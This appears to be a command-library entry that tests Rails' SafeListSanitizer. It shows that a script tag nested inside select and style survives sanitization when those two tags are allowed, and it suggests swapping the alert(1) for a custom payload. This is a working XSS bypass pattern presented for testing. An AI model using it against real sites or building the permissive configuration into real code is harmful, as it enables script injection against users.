---
id: cmd-uuid-2
data: |-
  frag = "<select><style><script>alert(1)</script></style></select>"
  tags = %w(select style)
  puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
tags:
  - xss
  - test
type: command
output: <select><style><script>alert(1)</script></style></select>
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.822Z'
verified: false
validated: true
submitted: true
---
# rails-sanitizer-direct-fragment-test

## Command

```ruby
frag = "<select><style><script>alert(1)</script></style></select>"
tags = %w(select style)
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

## Description

Tests sanitization on a direct HTML fragment in CRuby, showing the script tag is not scrubbed when select and style are allowed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| frag | HTML fragment with nested script | Yes |
| tags | Allowed tags array | Yes |

## Examples

### Basic Usage

```ruby
# Full command as above
```

### Advanced Usage

Vary the fragment:

```ruby
frag = "<select><style><script>custom_payload()</script></style></select>"
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

## Expected Output

Unsanitized output: "<select><style><script>alert(1)</script></style></select>"

## Related

- [[commands/rails-sanitizer-xss-bypass-demo]]
- [[procedures/Sanitize-Input-and-Verify-Script-Preservation]]
